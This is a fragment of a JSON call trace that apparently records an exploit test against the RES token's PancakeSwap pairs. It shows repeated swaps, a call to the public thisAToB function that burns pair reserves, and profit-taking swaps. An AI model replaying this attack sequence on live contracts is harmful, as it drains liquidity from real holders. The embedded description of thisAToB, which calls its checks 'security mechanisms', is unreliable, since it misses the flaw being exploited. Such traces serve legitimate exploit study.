+        "return_value": "RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "2512697084024901384488949 [2.512e24], 11472122436377 [1.147e13], 1665051347 [1.665e9]"
+    },
+    {
+        "id": "531",
+        "args": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "4765378318201854805537206 [4.765e24]"
+    },
+    {
+        "id": "658",
+        "args": "5415924297191 [5.415e12], 11472122436377 [1.147e13], 2512697084024901384488949 [2.512e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1186230121263345828940481 [1.186e24]"
+    },
+    {
+        "id": "531",
+        "args": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "4765378318201854805537206 [4.765e24]"
+    },
+    {
+        "id": "252",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73"
+    },
+    {
+        "id": "676",
+        "args": "RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "2512697084024901384488949 [2.512e24], 11472122436377 [1.147e13], 1665051347 [1.665e9]"
+    },
+    {
+        "id": "465",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]"
+    },
+    {
+        "id": "1021",
+        "args": "162477728915 [1.624e11], 11472122436377 [1.147e13], 2512697084024901384488949 [2.512e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "35003428118072400524796 [3.5e22]"
+    },
+    {
+        "id": "252",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73"
+    },
+    {
+        "id": "676",
+        "args": "USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955], ALL_TOKEN: [0x04C0f31C0f59496cf195d2d7F1dA908152722DE7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "480129195968803076456 [4.801e20], 41761128268609605264847 [4.176e22], 1665044901 [1.665e9]"
+    },
+    {
+        "id": "465",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "ALL_TOKEN: [0x04C0f31C0f59496cf195d2d7F1dA908152722DE7]"
+    },
+    {
+        "id": "1021",
+        "args": "35003428118072400524796 [3.5e22], 41761128268609605264847 [4.176e22], 480129195968803076456 [4.801e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "218633252797233879912 [2.186e20]"
+    },
+    {
+        "id": "6418",
+        "args": "0x272dC5Ab4Aba4c80DcD5dc46299dB44614d32Edd, 218633252797233879912 [2.186e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "439",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "4475079325253002664477 [4.475e21]"
+    },
+    {
+        "id": "252",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73"
+    },
+    {
+        "id": "676",
+        "args": "RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "2512697084024901384488949 [2.512e24], 11472122436377 [1.147e13], 1665051347 [1.665e9]"
+    },
+    {
+        "id": "465",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]"
+    },
+    {
+        "id": "1021",
+        "args": "433273943774 [4.332e11], 11472122436377 [1.147e13], 2512697084024901384488949 [2.512e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "91224453007222712880557 [9.122e22]"
+    },
+    {
+        "id": "252",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73"
+    },
+    {
+        "id": "676",
+        "args": "USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955], ALL_TOKEN: [0x04C0f31C0f59496cf195d2d7F1dA908152722DE7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "480129195968803076456 [4.801e20], 41761128268609605264847 [4.176e22], 1665044901 [1.665e9]"
+    },
+    {
+        "id": "465",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "ALL_TOKEN: [0x04C0f31C0f59496cf195d2d7F1dA908152722DE7]"
+    },
+    {
+        "id": "1021",
+        "args": "91224453007222712880557 [9.122e22], 41761128268609605264847 [4.176e22], 480129195968803076456 [4.801e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "329096418942594450331 [3.29e20]"
+    },
+    {
+        "id": "6418",
+        "args": "0xe3f0C9F99BECced5197300d64ea3a814ECD862f7, 329096418942594450331 [3.29e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "439",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "4475079325253002664477 [4.475e21]"
+    },
+    {
+        "id": "531",
+        "args": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "4765378318201854805537206 [4.765e24]"
+    },
+    {
+        "id": "563",
+        "args": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "6056198139186 [6.056e12]"
+    },
+    {
+        "id": "563",
+        "args": "0x272dC5Ab4Aba4c80DcD5dc46299dB44614d32Edd",
+        "original_code": null,
+        "description": null,
+        "return_value": "88874026289646 [8.887e13]"
+    },
+    {
+        "id": "116781",
+        "args": "2252681234176953421048257 [2.252e24], 0, [0x55d398326f99059fF775485246999027B3197955, 0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], 0x272dC5Ab4Aba4c80DcD5dc46299dB44614d32Edd, 1665051347 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6034",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], 2252681234176953421048257 [2.252e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "563",
+        "args": "0x272dC5Ab4Aba4c80DcD5dc46299dB44614d32Edd",
+        "original_code": null,
+        "description": null,
+        "return_value": "88874026289646 [8.887e13]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "4765378318201854805537206 [4.765e24], 6056198139186 [6.056e12], 1665051347 [1.665e9]"
+    },
+    {
+        "id": "531",
+        "args": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "7018059552378808226585463 [7.018e24]"
+    },
+    {
+        "id": "101055",
+        "args": "0, 1940637034893 [1.94e12], 0x272dC5Ab4Aba4c80DcD5dc46299dB44614d32Edd, 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "85933",
+        "args": "0x272dC5Ab4Aba4c80DcD5dc46299dB44614d32Edd, 1940637034893 [1.94e12]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "439",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "5607099684513225068 [5.607e18]"
+    },
+    {
+        "id": "465",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]"
+    },
+    {
+        "id": "397",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "4765378318201854805537206 [4.765e24], 6056198139186 [6.056e12], 1665051347 [1.665e9]"
+    },
+    {
+        "id": "531",
+        "args": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "7018059552378808226585463 [7.018e24]"
+    },
+    {
+        "id": "658",
+        "args": "1940637034893 [1.94e12], 6056198139186 [6.056e12], 4765378318201854805537206 [4.765e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1527009096637915477107208 [1.527e24]"
+    },
+    {
+        "id": "531",
+        "args": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "7018059552378808226585463 [7.018e24]"
+    },
+    {
+        "id": "252",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73"
+    },
+    {
+        "id": "676",
+        "args": "RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "4765378318201854805537206 [4.765e24], 6056198139186 [6.056e12], 1665051347 [1.665e9]"
+    },
+    {
+        "id": "465",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]"
+    },
+    {
+        "id": "1021",
+        "args": "58219111046 [5.821e10], 6056198139186 [6.056e12], 4765378318201854805537206 [4.765e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "45261727434977385255275 [4.526e22]"
+    },
+    {
+        "id": "252",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73"
+    },
+    {
+        "id": "676",
+        "args": "USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955], ALL_TOKEN: [0x04C0f31C0f59496cf195d2d7F1dA908152722DE7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "480129195968803076456 [4.801e20], 41761128268609605264847 [4.176e22], 1665044901 [1.665e9]"
+    },
+    {
+        "id": "465",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "ALL_TOKEN: [0x04C0f31C0f59496cf195d2d7F1dA908152722DE7]"
+    },
+    {
+        "id": "1021",
+        "args": "45261727434977385255275 [4.526e22], 41761128268609605264847 [4.176e22], 480129195968803076456 [4.801e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "249421500293550152154 [2.494e20]"
+    },
+    {
+        "id": "6418",
+        "args": "0x272dC5Ab4Aba4c80DcD5dc46299dB44614d32Edd, 249421500293550152154 [2.494e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "439",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "4475079325253002664477 [4.475e21]"
+    },
+    {
+        "id": "252",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73"
+    },
+    {
+        "id": "676",
+        "args": "RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "4765378318201854805537206 [4.765e24], 6056198139186 [6.056e12], 1665051347 [1.665e9]"
+    },
+    {
+        "id": "465",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]"
+    },
+    {
+        "id": "1021",
+        "args": "155250962790 [1.552e11], 6056198139186 [6.056e12], 4765378318201854805537206 [4.765e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "118817058961611232573531 [1.188e23]"
+    },
+    {
+        "id": "252",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73"
+    },
+    {
+        "id": "676",
+        "args": "USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955], ALL_TOKEN: [0x04C0f31C0f59496cf195d2d7F1dA908152722DE7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "480129195968803076456 [4.801e20], 41761128268609605264847 [4.176e22], 1665044901 [1.665e9]"
+    },
+    {
+        "id": "465",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "ALL_TOKEN: [0x04C0f31C0f59496cf195d2d7F1dA908152722DE7]"
+    },
+    {
+        "id": "1021",
+        "args": "118817058961611232573531 [1.188e23], 41761128268609605264847 [4.176e22], 480129195968803076456 [4.801e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "355031905264109957905 [3.55e20]"
+    },
+    {
+        "id": "6418",
+        "args": "0xe3f0C9F99BECced5197300d64ea3a814ECD862f7, 355031905264109957905 [3.55e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "439",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "4475079325253002664477 [4.475e21]"
+    },
+    {
+        "id": "531",
+        "args": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "7018059552378808226585463 [7.018e24]"
+    },
+    {
+        "id": "563",
+        "args": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "4115561104293 [4.115e12]"
+    },
+    {
+        "id": "563",
+        "args": "0x272dC5Ab4Aba4c80DcD5dc46299dB44614d32Edd",
+        "original_code": null,
+        "description": null,
+        "return_value": "90523567769305 [9.052e13]"
+    },
+    {
+        "id": "116781",
+        "args": "2252681234176953421048257 [2.252e24], 0, [0x55d398326f99059fF775485246999027B3197955, 0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], 0x272dC5Ab4Aba4c80DcD5dc46299dB44614d32Edd, 1665051347 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "6034",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], 2252681234176953421048257 [2.252e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "563",
+        "args": "0x272dC5Ab4Aba4c80DcD5dc46299dB44614d32Edd",
+        "original_code": null,
+        "description": null,
+        "return_value": "90523567769305 [9.052e13]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "7018059552378808226585463 [7.018e24], 4115561104293 [4.115e12], 1665051347 [1.665e9]"
+    },
+    {
+        "id": "531",
+        "args": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "9270740786555761647633720 [9.27e24]"
+    },
+    {
+        "id": "101055",
+        "args": "0, 998139316684 [9.981e11], 0x272dC5Ab4Aba4c80DcD5dc46299dB44614d32Edd, 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "85933",
+        "args": "0x272dC5Ab4Aba4c80DcD5dc46299dB44614d32Edd, 998139316684 [9.981e11]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "439",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "5607099684513225068 [5.607e18]"
+    },
+    {
+        "id": "465",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]"
+    },
+    {
+        "id": "397",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "7018059552378808226585463 [7.018e24], 4115561104293 [4.115e12], 1665051347 [1.665e9]"
+    },
+    {
+        "id": "531",
+        "args": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "9270740786555761647633720 [9.27e24]"
+    },
+    {
+        "id": "658",
+        "args": "998139316684 [9.981e11], 4115561104293 [4.115e12], 7018059552378808226585463 [7.018e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1702076822222852371746731 [1.702e24]"
+    },
+    {
+        "id": "531",
+        "args": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "9270740786555761647633720 [9.27e24]"
+    },
+    {
+        "id": "252",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73"
+    },
+    {
+        "id": "676",
+        "args": "RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "7018059552378808226585463 [7.018e24], 4115561104293 [4.115e12], 1665051347 [1.665e9]"
+    },
+    {
+        "id": "465",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]"
+    },
+    {
+        "id": "1021",
+        "args": "29944179500 [2.994e10], 4115561104293 [4.115e12], 7018059552378808226585463 [7.018e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "50567646416210872571274 [5.056e22]"
+    },
+    {
+        "id": "252",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73"
+    },
+    {
+        "id": "676",
+        "args": "USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955], ALL_TOKEN: [0x04C0f31C0f59496cf195d2d7F1dA908152722DE7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "480129195968803076456 [4.801e20], 41761128268609605264847 [4.176e22], 1665044901 [1.665e9]"
+    },
+    {
+        "id": "465",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "ALL_TOKEN: [0x04C0f31C0f59496cf195d2d7F1dA908152722DE7]"
+    },
+    {
+        "id": "1021",
+        "args": "50567646416210872571274 [5.056e22], 41761128268609605264847 [4.176e22], 480129195968803076456 [4.801e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "262664719983692401484 [2.626e20]"
+    },
+    {
+        "id": "6418",
+        "args": "0x272dC5Ab4Aba4c80DcD5dc46299dB44614d32Edd, 262664719983692401484 [2.626e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "439",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "4475079325253002664477 [4.475e21]"
+    },
+    {
+        "id": "252",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73"
+    },
+    {
+        "id": "676",
+        "args": "RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "7018059552378808226585463 [7.018e24], 4115561104293 [4.115e12], 1665051347 [1.665e9]"
+    },
+    {
+        "id": "465",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]"
+    },
+    {
+        "id": "1021",
+        "args": "79851145334 [7.985e10], 4115561104293 [4.115e12], 7018059552378808226585463 [7.018e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "133246903898631276608717 [1.332e23]"
+    },
+    {
+        "id": "252",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73"
+    },
+    {
+        "id": "676",
+        "args": "USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955], ALL_TOKEN: [0x04C0f31C0f59496cf195d2d7F1dA908152722DE7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "480129195968803076456 [4.801e20], 41761128268609605264847 [4.176e22], 1665044901 [1.665e9]"
+    },
+    {
+        "id": "465",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "ALL_TOKEN: [0x04C0f31C0f59496cf195d2d7F1dA908152722DE7]"
+    },
+    {
+        "id": "1021",
+        "args": "133246903898631276608717 [1.332e23], 41761128268609605264847 [4.176e22], 480129195968803076456 [4.801e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "365340321166853363865 [3.653e20]"
+    },
+    {
+        "id": "6418",
+        "args": "0xe3f0C9F99BECced5197300d64ea3a814ECD862f7, 365340321166853363865 [3.653e20]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "439",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "4475079325253002664477 [4.475e21]"
+    },
+    {
+        "id": "531",
+        "args": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "9270740786555761647633720 [9.27e24]"
+    },
+    {
+        "id": "563",
+        "args": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "3117421787609 [3.117e12]"
+    },
+    {
+        "id": "563",
+        "args": "0x272dC5Ab4Aba4c80DcD5dc46299dB44614d32Edd",
+        "original_code": null,
+        "description": null,
+        "return_value": "91371986188486 [9.137e13]"
+    },
+    {
+        "id": "154952",
+        "args": "",
+        "original_code": "    function thisAToB() external{\n        _thisAToB();\n    }\n    \n    function _thisAToB() internal{\n        if (_balances[address(this)] > _minAToB){\n            uint256 burnNumber = _balances[address(this)];\n            _approve(address(this),_pancakeRouterToken, _balances[address(this)]);\n            IPancakeRouter(_pancakeRouterToken).swapExactTokensForTokensSupportingFeeOnTransferTokens(\n                _balances[address(this)],\n                0,\n                _pathAToB,\n                address(this),\n                block.timestamp);\n            _burn(_swapV2Pair, burnNumber);\n            IPancakePair(_swapV2Pair).sync();\n        }\n    }\n    \n",
+        "description": "1. Core functions:  \nThe main purpose of this code is to convert a specific token (Token A) into another token (Token B) using a decentralized exchange (PancakeSwap). The function `thisAToB` is the entry point, which calls the internal function `_thisAToB`. The internal function checks if the contract holds enough Token A to perform the swap. If the condition is met, it approves the transfer of Token A to the PancakeSwap router, performs the swap, and then burns the remaining Token A to maintain balance. Finally, it synchronizes the pair contract to update the reserves.\n\n2. Security mechanism:  \nThe function `thisAToB` is marked as `external`, meaning it can only be called from outside the contract, ensuring controlled access. The internal function `_thisAToB` is not directly accessible externally, adding a layer of protection. The code also includes checks to ensure the contract holds sufficient Token A (`_balances[address(this)] > _minAToB`) before proceeding with the swap, preventing unnecessary or failed transactions. Additionally, the use of `block.timestamp` ensures the transaction is executed within a valid time frame.\n\n3. Parameter Function:  \nThe function `thisAToB` does not take any parameters, as it directly interacts with the contract's internal state. The internal function `_thisAToB` relies on predefined variables like `_balances`, `_minAToB`, `_pancakeRouterToken`, `_pathAToB`, and `_swapV2Pair`. These variables are likely set elsewhere in the contract and represent the contract's Token A balance, the minimum required amount for the swap, the PancakeSwap router address, the swap path (Token A to Token B), and the trading pair contract, respectively.\n\n4. Return description:  \nNeither function returns a value. Instead, they perform actions such as approving token transfers, executing swaps, burning tokens, and synchronizing the pair contract. The focus is on modifying the contract's state and interacting with external protocols rather than calculating or returning specific data.\n\nIn summary,  \nThis code facilitates the conversion of Token A to Token B via PancakeSwap, ensuring sufficient balance and proper execution. It employs security measures like access control and balance checks while relying on predefined parameters to perform the swap and maintain system integrity. The functions do not return values but focus on state changes and external interactions.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "100581",
+        "args": "11838394136197 [1.183e13], 0, [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21, 0x55d398326f99059fF775485246999027B3197955, 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7], RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], 1665051347 [1.665e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "13758",
+        "args": "RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], 11838394136197 [1.183e13]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "439",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "5607099684513225068 [5.607e18]"
+    },
+    {
+        "id": "541",
+        "args": "RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "28089177317909101452156 [2.808e22]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "9270740786555761647633720 [9.27e24], 3117421787609 [3.117e12], 1665051347 [1.665e9]"
+    },
+    {
+        "id": "563",
+        "args": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "14955815923806 [1.495e13]"
+    },
+    {
+        "id": "23193",
+        "args": "7334496416954473188189698 [7.334e24], 0, USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "8071",
+        "args": "USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb], 7334496416954473188189698 [7.334e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "531",
+        "args": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1936244369601288459444022 [1.936e24]"
+    },
+    {
+        "id": "563",
+        "args": "USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]",
+        "original_code": null,
+        "description": null,
+        "return_value": "14955815923806 [1.495e13]"
+    },
+    {
+        "id": "893",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "480129195968803076456 [4.801e20], 41761128268609605264847 [4.176e22], 1665044901 [1.665e9]"
+    },
+    {
+        "id": "531",
+        "args": "USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]",
+        "original_code": null,
+        "description": null,
+        "return_value": "7376257545223082793454545 [7.376e24]"
+    },
+    {
+        "id": "48305",
+        "args": "477404141417463290209 [4.774e20], 0, RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], 0x",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "15921",
